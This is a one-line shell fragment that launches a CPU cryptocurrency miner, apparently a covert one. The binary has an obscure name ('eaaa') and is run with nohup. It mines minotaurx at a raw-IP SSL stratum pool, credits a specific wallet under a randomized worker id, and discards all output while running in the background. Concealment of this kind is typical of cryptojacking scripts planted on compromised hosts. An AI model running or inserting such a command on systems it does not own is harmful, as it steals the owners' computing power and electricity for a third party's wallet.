...
nohup ./eaaa --algorithm minotaurx --pool stratum+ssl://103.249.70.7:17019 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu-threads 4 --disable-gpu &> /dev/null &
